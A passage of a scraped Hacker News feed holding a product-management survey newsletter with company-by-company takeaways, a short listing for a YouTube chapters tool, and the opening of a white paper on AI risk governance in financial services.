to <a href="https://www.linkedin.com/in/talsraviv/?originalSubdomain=il">Tal Raviv</a>, <a href="https://www.linkedin.com/in/manikg">Manik Gupta</a>, <a href="https://www.linkedin.com/in/helensims">Helen Sims</a>, <a href="https://www.linkedin.com/in/ajfrank/">AJ Frank</a>, <a href="https://www.linkedin.com/in/matthias-wagner-5220b047/">Matthias Wagner</a>, <a href="https://www.linkedin.com/in/karaskrip/">Kara Skrip</a>, <a href="https://www.linkedin.com/in/seanplynch/">Sean Lynch</a>, <a href="https://www.linkedin.com/in/petesauer/">Peter Sauer</a>, and <a href="https://www.linkedin.com/in/kiyanibamba/">Kiyani Bamba</a> for feedback on the survey and post.</em></p><p><strong>A few quick disclaimers:</strong></p><ol><li><p>I’m no survey expert. I may have gotten something wrong. Please forgive me if so, and please <a href="https://forms.gle/HKtkAXRhWSRqVNqf8">give me feedback</a>.</p></li><li><p>85% of the responders were product managers (as planned), so assume bias from that perspective.</p></li><li><p>When I mention specific companies below, I made sure to have at least two data points from that company.</p></li></ol><p>Let’s dive in!</p><h2>Who took the survey</h2><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=723289895"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F248d2fc3-c0e9-4264-92d8-2e0520a6e447_2000x1266.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/248d2fc3-c0e9-4264-92d8-2e0520a6e447_2000x1266.png&quot;,&quot;height&quot;:922,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1309072,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=723289895&quot;}" alt=""></a></figure></div><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1938272815"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F094b4bba-2f46-4c73-8adf-3e00675a1ece_2000x1749.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/094b4bba-2f46-4c73-8adf-3e00675a1ece_2000x1749.png&quot;,&quot;height&quot;:1273,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:178028,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1938272815&quot;}" alt=""></a></figure></div><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1938272815"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8fa457b9-db26-438d-a429-88b20e801f53_2000x1392.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/8fa457b9-db26-438d-a429-88b20e801f53_2000x1392.png&quot;,&quot;height&quot;:1013,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:59220,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1938272815&quot;}" alt=""></a></figure></div><h2>Being a Product Manager</h2><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1402367635"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fcf1e593c-cf7e-4ec4-9dc9-b0a4988e92a2_2000x1433.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/cf1e593c-cf7e-4ec4-9dc9-b0a4988e92a2_2000x1433.png&quot;,&quot;height&quot;:1043,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:114802,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1402367635&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p><strong>Most frequently valued</strong>: Communication, execution, product sense</p></li><li><p><strong>Least frequently valued</strong>: Design/UX, empathy, raw intelligence</p></li></ol></blockquote><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=0"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa540c078-53e6-4d0e-b893-b097c28256be_2000x2042.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a540c078-53e6-4d0e-b893-b097c28256be_2000x2042.png&quot;,&quot;height&quot;:1487,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:216224,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=0&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>Companies who spike on Communication: <strong>HubSpot, Salesforce</strong></p></li><li><p>Companies who spike on Execution: <strong>Salesforce, Tesla, VMware</strong></p></li><li><p>Companies who spike on Product sense: <strong>Asana, Flipkart, Intercom, Netflix, ServiceNow, WhatsApp</strong></p></li><li><p>Companies who spike on Strategic thinking: <strong>Coinbase, Stripe, Zillow</strong></p></li><li><p>Companies who spike on Collaboration: <strong>Atlassian, Box, ServiceNow, Spotify, Twitter</strong></p></li><li><p>Companies who spike on Data acumen: <strong>Quora, Reddit, Zynga</strong></p></li><li><p>Companies who spike on Technical background: <strong>Oracle, Stripe</strong></p></li><li><p>Companies who spike on Raw intelligence: <strong>Coinbase, Robinhood</strong></p></li><li><p>Companies who spike on Empathy: <strong>HubSpot, Intercom</strong></p></li><li><p>Companies who spike on Design/UX: <strong>WhatsApp</strong></p></li></ol></blockquote><h2>Getting promoted</h2><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1717122536"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F74ce70b3-5879-4081-93e0-3f210c1f8332_1996x1290.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/74ce70b3-5879-4081-93e0-3f210c1f8332_1996x1290.png&quot;,&quot;height&quot;:941,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:94279,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1717122536&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>Showing significant impact on the business — by far the most common thing to get right</p></li><li><p>Unlike the mini-CEO label PMs often get, in reality they must keep their external stakeholders onboard to be successful</p></li><li><p>Keeping their team and manager happy — less of a priority at most companies, but as you’ll see below, very important at some</p></li></ol></blockquote><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=336985443"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F80eb5c80-9e83-4195-bd3a-2376381d383d_2002x2682.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/80eb5c80-9e83-4195-bd3a-2376381d383d_2002x2682.png&quot;,&quot;height&quot;:1951,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:280301,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=336985443&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>Companies who prioritize Showing significant business impact: <strong>Atlassian, Capital One, Coinbase, Expedia, HubSpot, Netflix, Square, Wayfair, Yelp, YouTube, Zillow</strong></p></li><li><p>Companies who prioritize Keeping stakeholders onboard: <strong>Atlassian, Booking, IBM, VMware, Wayfair, Zillow</strong></p></li><li><p>Companies who prioritize Hitting goals: <strong>Airbnb, Reddit, Yelp, Zynga&nbsp;</strong></p></li><li><p>Companies who prioritize Shipping great product: <strong>Adobe, Hubspot, Intercom, Robinhood, Stripe, WhatsApp</strong></p></li><li><p>Companies who prioritize Making their manager happy: <strong>Apple, IBM, Oracle </strong></p></li><li><p>Companies who prioritize Keeping their team happy: <strong>Intercom, Quora, Visa</strong></p></li></ol></blockquote><h2>Influence</h2><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1081679648"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8c5c2b1-1bec-4c47-97d7-f5823ac25ca9_2000x1363.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f8c5c2b1-1bec-4c47-97d7-f5823ac25ca9_2000x1363.png&quot;,&quot;height&quot;:992,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:89529,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1081679648&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>According to responders (mostly PMs), PMs have more influence than other functions at over 80% of companies</p></li><li><p>Similarly, PMs have “a lot more” influence at ~50% of companies</p></li><li><p>Almost no companies have PMs with a lot <em>less</em> influence than other functions</p></li></ol></blockquote><p><em>Looking at this same data but excluding responses from product managers (e.g. only looking at responses from engineers, designers, CEOs, etc.), the story shifts a bit:</em></p><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1081679648"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4c3c9c1b-6f38-462f-bc79-484c05d3c76d_2000x1408.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/4c3c9c1b-6f38-462f-bc79-484c05d3c76d_2000x1408.png&quot;,&quot;height&quot;:1025,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:93441,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1081679648&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>From this perspective, we find that PMs have more influence than other functions at only 70% of companies (vs. 80% above). Clearly, PMs believe they have more influence than their teammates think they do.</p></li><li><p>However, most of the variance comes from the number of responders who believe PMs run the show — ~13% when looking at all responses, but only ~6% when PM responses are excluded.</p></li><li><p>In both cases, roughly the same percentage of companies have PMs with slightly more, or a lot more, influence (~65%).</p></li></ol></blockquote><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=259998754"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe4a2909a-426a-459c-8bc0-b9151cc9a25a_2002x1035.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/e4a2909a-426a-459c-8bc0-b9151cc9a25a_2002x1035.png&quot;,&quot;height&quot;:753,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:176142,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=259998754&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p><strong>The spectrum varies widely</strong>: from Zynga where PMs run the show, to Apple where PMs have the least influence</p></li><li><p><strong>Noteworthy companies where PMs have a lot more influence</strong>: YouTube, LinkedIn, Twitter, Uber, Robinhood, Lyft, Coinbase, Asana, Airbnb</p></li><li><p><strong>Noteworthy companies where PMs have relatively less influence</strong>: Apple, Oracle, Stripe, Tesla</p></li></ol></blockquote><h2>Heart vs. Hands vs. Head</h2><p>It's often said that companies are defined by how they index on Heart (e.g. empathy, culture) vs. Hands (e.g. execution) vs. Head (e.g. intelligence). When describing PMs at your company, how would you stack rank the importance of Heart, Hands, and Head?</p><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1900512953"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F5d347488-07b9-4504-95bb-43f2dcc8b720_2000x1103.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/5d347488-07b9-4504-95bb-43f2dcc8b720_2000x1103.png&quot;,&quot;height&quot;:803,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:144688,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1900512953&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>Companies who spike on <strong>Heart</strong>: Asana, Spotify, WhatsApp</p></li><li><p>Companies who spike on <strong>Hands</strong>: Flipkart, Okta, PayPal, Quora, Tesla, Wayfair, Yelp </p></li><li><p>Companies who spike on <strong>Head</strong>: Coinbase, Uber, YouTube, Zynga</p></li></ol></blockquote><h2>What’s next</h2><p>This is the first time I’ve conducted a survey like this. Depending on how it’s received, I hope to run it again sometime in the future. If you have any feedback on the results, the analysis, or the way it was run, I’d love to hear it. <a href="https://forms.gle/HKtkAXRhWSRqVNqf8">Please leave your feedback here</a>.</p><p>And lastly, if you see any other interesting takeaways when looking at this data, please leave a comment 👇</p><p data-attrs="{&quot;url&quot;:&quot;https://www.lennyrachitsky.com/p/product-management-survey/comments&quot;,&quot;text&quot;:&quot;Leave a comment&quot;,&quot;class&quot;:null}"><a href="https://www.lennyrachitsky.com/p/product-management-survey/comments"><span>Leave a comment</span></a></p><p>See you next week!</p><h2><strong>🔥&nbsp;Job opportunities</strong></h2><p><strong>✨ </strong>Sponsored job of the week: <strong><a href="https://boards.greenhouse.io/userleap/jobs/4279026003">Product Manager at UserLeap</a>&nbsp;✨</strong></p><ol><li><p><strong>Product</strong>:&nbsp;<a href="https://boards.greenhouse.io/cerebral/jobs/4124465003">Cerebral</a>,&nbsp;<a href="https://jobs.lever.co/descript-2/08f9b563-c3e6-49a4-be07-82fafc1868af">Descript</a>,&nbsp;<a href="https://angel.co/company/kudo-meeting/jobs/913705-product-manager">KUDO</a>,&nbsp;<a href="https://jobs.lever.co/hipcamp/d04821c3-fb9a-4d3f-9a7a-1b75deacc09f">Hipcamp</a>,&nbsp;<a href="https://apply.workable.com/prenda/j/63270A44BB/">Prenda</a></p></li><li><p><strong>Growth</strong>:&nbsp;<a href="https://www.basisone.com/careers/growth-strategy-lead">BasisOne</a>,&nbsp;<a href="https://boards.greenhouse.io/coda/jobs/4794809002">Coda</a>,&nbsp;<a href="http://levels.link/growth">Levels</a>,&nbsp;<a href="https://apply.workable.com/prenda/j/AC98C5FDFB/">Prenda</a></p></li><li><p><strong>Design</strong>:&nbsp;<a href="https://jobs.ashbyhq.com/ashby/145ff46b-1441-4773-bcd3-c8c90baa598a">Ashby</a>,&nbsp;<a href="https://www.cascade.io/jobs/analytical-product-designer">Cascade</a>,&nbsp;<a href="https://docs.google.com/document/d/1_aHEl08ahc6NjOhwmi9GQlNv8CvlOwf8hL-FyCrmAes/edit">Office Hours</a>,&nbsp;<a href="https://www.notion.so/A-Product-Designer-baa24543701f472bb291d4429812064a">Runway</a>,&nbsp;<a href="https://jobs.lever.co/stytch/675e6a11-5a33-41bc-9315-5a3ca141d444">Stytch</a>,&nbsp;<a href="https://www.notion.so/Designer-Watershed-7cb7bf8bd750432399d36e83e4e32391">Watershed</a></p></li><li><p><strong>Engineering manager</strong>:&nbsp;<a href="https://boards.greenhouse.io/cerebral/jobs/4076598003">Cerebral</a></p></li><li><p><strong>Frontend engineer</strong>:&nbsp;<a href="https://www.notion.so/levelshealth/Join-Levels-Remote-Developer-58454f0db7e3466692f7b75db6237ddf">Levels</a>,&nbsp;<a href="https://www.notion.so/Front-end-Developer-929e1933b9b4432a851043adbb7bff04">Practice</a>, <a href="https://www.linkedin.com/jobs/view/2323962506/">Tome</a></p></li><li><p><strong>Backend engineer</strong>:&nbsp;<a href="https://boards.greenhouse.io/coda/jobs/4489268002">Coda</a>,&nbsp;<a href="https://sourcetable.com/jobs#backend-engineer">Sourcetable</a>,&nbsp;<a href="https://transformdata.io/careers/">Transform</a></p></li><li><p><strong>Fullstack engineer</strong>: <a href="https://www.cascade.io/jobs/full-stack-product-engineer">Cascade</a>,&nbsp;<a href="https://www.notion.so/Software-Developer-e7cad269968e4d5aaeb1f6da9e282626">Centered</a>,&nbsp;<a href="https://boards.greenhouse.io/cerebral/jobs/4188468003">Cerebral</a>,&nbsp;<a href="https://icebreaker.video/product-engineer">Icebreaker</a>,&nbsp;<a href="https://www.notion.so/askiggy/Full-Stack-Engineer-IggyAPI-5a8c1825028e421b9587538718f370b4">Iggy</a>,&nbsp;<a href="https://www.notion.so/Senior-Software-Engineer-Full-stack-web-San-Francisco-CA-3a0af35008104def82836a5b9a5a88e1">Primer</a>,&nbsp;<a href="https://www.notion.so/A-Product-first-Full-stack-Engineer-5e056689b68048aeb1ccfea6ac73eb9e">Runway</a>,&nbsp;<a href="https://jobs.lever.co/snackpass/7c3bb72b-70d3-45ca-9dea-eea57ed5333d">Snackpass</a></p></li><li><p><strong>iOS engineer</strong>:&nbsp;<a href="https://www.notion.so/Lead-iOS-Developer-ba18577b6ba44ad68e45b8e7a957353c">Pairplay</a>,&nbsp;<a href="https://www.notion.so/Senior-Software-Engineer-iOS-San-Francisco-CA-87f0fd3ee3dc4c3f8d0419c07fcdd434">Primer</a>,&nbsp;<a href="https://jobs.lever.co/stytch/d3bf3860-4aaa-4a23-8e28-dad20957be44">Stytch</a>,&nbsp;<a href="https://www.notion.so/Mobile-Engineer-Vori-c5ceccd966a04c8aa9e970f0355ca13c">Vori</a></p></li></ol><h4><strong>How would you rate this week's newsletter? 🤔</strong></h4><p><a href="https://t.sidekickopen82.com/s1t/c/5/f18dQhb0S7kF8cV_VXW1CdjwB59hl3kW7_k2847sD3qkVNxJHk1CX2ZcW2bzNJl8lkfc1101?te=W3R5hFj4cm2zwW4cQKtC3KcLnYW4hLZp03ZVbTxW1JB0ML1--tKxW20ZTw51-YpBFW1W_jBk1ZmvHBW21j9tt1-_j_TW1Vnkcj1V3fMvw1V21pC4Hp2&amp;si=7000000001348012&amp;pi=6174bab6-7009-4402-a497-3d6f867fbea1">Great</a>&nbsp;•&nbsp;<a href="https://t.sidekickopen82.com/s1t/c/5/f18dQhb0S7kF8cV_VXW1CdjwB59hl3kW7_k2847sD3qkVNxJHk1CX2ZcW2bzNJl8lkfc1101?te=W3R5hFj4cm2zwW4cQKtC3KcLnYW4hLZp03ZVbTxW1JB0ML1--tKxW20ZTw51-YpBFW1W_jBk1ZmvHBW21j9tt1-_j_TW1Vnkcj1V3fMvw1V21pC4vX2&amp;si=7000000001348012&amp;pi=6174bab6-7009-4402-a497-3d6f867fbea1">Good</a>&nbsp;•&nbsp;<a href="https://t.sidekickopen82.com/s1t/c/5/f18dQhb0S7kF8cV_VXW1CdjwB59hl3kW7_k2847sD3qkVNxJHk1CX2ZcW2bzNJl8lkfc1101?te=W3R5hFj4cm2zwW4cQKtC3KcLnYW4hLZp03ZVbTxW1JB0ML1--tKxW20ZTw51-YpBFW1W_jBk1ZmvHBW21j9tt1-_j_TW1Vnkcj1V3fMvw1V21pC4kr2&amp;si=7000000001348012&amp;pi=6174bab6-7009-4402-a497-3d6f867fbea1">Meh</a></p><p>If you’d like to receive this newsletter weekly, consider subscribing 👇</p><p>Sincerely,<br>Lenny 👋</p></div></div>]]>
            </description>
            <link>https://www.lennyrachitsky.com/p/product-management-survey</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513614</guid>
            <pubDate>Wed, 23 Dec 2020 02:03:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A simple tool for quickly making YouTube Chapters]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25513581">thread link</a>) | @nassimslab2
<br/>
December 22, 2020 | https://nassim-saboundji.github.io/Quick-Chapters-for-YouTube/ | <a href="https://web.archive.org/web/*/https://nassim-saboundji.github.io/Quick-Chapters-for-YouTube/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

    
    <p>Quickly make chapters for YouTube videos. Just pause and add a chapter.</p>
    
    
    <br>
    
    

    
    <a href="https://github.com/Nassim-Saboundji" target="_blank">Made by Nassim Saboundji</a>
  
</div>]]>
            </description>
            <link>https://nassim-saboundji.github.io/Quick-Chapters-for-YouTube/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513581</guid>
            <pubDate>Wed, 23 Dec 2020 01:57:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AI Risk and Governance]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25513343">thread link</a>) | @ai_enthu
<br/>
December 22, 2020 | https://www.airsgroup.ai/artificial-intelligence-governance | <a href="https://web.archive.org/web/*/https://www.airsgroup.ai/artificial-intelligence-governance">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="comp-kixls2qe1" data-testid="richTextElement"><h2><span>Executive Summary</span></h2>

<p>As financial services firms evaluate the potential applications of artificial intelligence (AI), for example: to enhance the customer experience and garner operational efficiencies,&nbsp;Artificial Intelligence/Machine Learning (AI/ML) Risk and Security&nbsp;(“AIRS”)<span><a href="https://ai.wharton.upenn.edu/artificial-intelligence-risk-governance/#_ftn1" target="_blank" rel="noopener">[1]</a></span>&nbsp;is committed to furthering this dialogue and has drafted the following overview discussing AI implementation and the corresponding potential risks firms may wish to consider in formulating their AI strategy. This white paper provides AIRS’s views on potential approaches to AI governance for financial services including potential risks, risk categorization, interpretability, discrimination, and risk mitigation, in particular, as applied to the financial industry.</p>

<p><span>​</span></p>

<p>This paper is intended for discussion purposes only and is not intended to serve as a prescriptive roadmap for implementing AI/ML tools or as a comprehensive inventory of risk associated with the use of AI. Readers are encouraged to consider the information provided in this paper for reference and discussion purposes. They should assess, implement, and tailor their firms’ AI/ML programs and respective controls as appropriate for their business model, product and service mix, and applicable legal and regulatory requirements.</p>

<p>The views expressed in this paper are those of the individual contributors and do not constitute the views of any of the firms with which the contributors are associated or by which they are employed.</p>

<p><span>​</span></p>

<h4>Key Takeaways</h4>

<ul>
	<li>
	<p>AIRS believes there are significant potential benefits of AI and that its adoption within financial services presents opportunities to improve both business and societal outcomes when risks are managed responsibly.</p>
	</li>
	<li>
	<p>This paper explores the potential risks of AI and provides a standardized practical categorization of these risks: Data Related Risks, AI/ML Attacks, Testing and Trust, and Compliance</p>
	</li>
	<li>
	<p>AI governance frameworks could help organizations learn, govern, monitor, and mature AI adoption. Four core components of AI governance are: definitions, inventory, policy/standards, and a governance framework, including controls.</p>
	</li>
	<li>
	<p>AI, in certain use cases, could lead to privacy issues, and/or potentially discriminatory or unfair outcomes, if not implemented with appropriate care. We explore, in detail, the subject of interpretability and discrimination in using AI for certain use cases.</p>
	</li>
	<li>
	<p>While there is no one-size-fits-all approach, practices institutions might consider adopting to mitigate AI risk include oversight and monitoring, enhancing explainability and interpretability, as well as exploring the use of evolving risk-mitigating techniques like differential privacy, and watermarking, among others.</p>
	</li>
</ul>



<h4>AIRS Next Steps</h4>

<p>This document is meant to be the first of several iterations and further contributions from the AIRS group. These insights are based on collective experience of AIRS, and the suggestions we outline are, as a result, not meant to be comprehensive. AIRS plans to continue to build and engage an active community on these issues. Contact information is provided in Section 6 (Acknowledgments) if there is any feedback or if readers wish to comment on this paper or AIRS.</p>

<p><span>​</span></p>

<p><span>​</span></p>

<h2><span>1. Overview</span></h2>

<h4>1.1 Document Purpose &amp; Scope</h4>

<p>The business uses, regulatory interest and research in artificial intelligence and machine learning (AI/ML) have seen an exponential increase over the last few years. Discussions regarding the use of Artificial Intelligence (AI) and Machine Learning (ML) have gained momentum as financial services firms evaluate the potential applications of AI, including for example: to enhance the customer experience and garner operational efficiencies. AIRS is committed to furthering this dialogue and has drafted the following overview addressing the use of AI within financial services, discussing AI implementation and the corresponding potential risks firms may wish to consider in formulating their AI strategy. Our hope is to contribute to and establish an industry-wide view of the potential risks and mitigants in this rapidly evolving domain of AI/ML, as they may apply to individual firms depending on their use of AI systems.</p>

<p><span>​</span></p>

<p>In this document, AIRS members present their views, guidance, and a structure for conceiving AI/ML risks and governance, drawing upon our combined experience implementing and managing technology risks in the financial sector. The views expressed in this paper are meant to assist individuals and organizations facing risks and governance challenges presented by AI/ML. However, it is critical that each institution assess its own AI uses, risk profile and risk tolerance and design governance frameworks that fit their unique circumstances. As such, this paper is not meant to be comprehensive or prescriptive.</p>

<p><span>​</span></p>

<h4>1.2 AIRS</h4>

<p>AIRS is an informal group of practitioners and academics from varied backgrounds, including technology risk, information security, legal, privacy, architects, model risk management, and others working for financial, technology organizations, and academic institutions. The AIRS working group, based in New York, was initiated in early 2019 and has grown to nearly 40 members from dozens of institutions (and continues to grow).</p>

<p><span>​</span></p>

<p>The AIRS Working Group seeks to promote, educate, and advance AI/ML governance for the financial services industry by focusing on risk identification, categorization, and mitigation.</p>

<h4>1.3 Definitions &amp; Assumptions</h4>

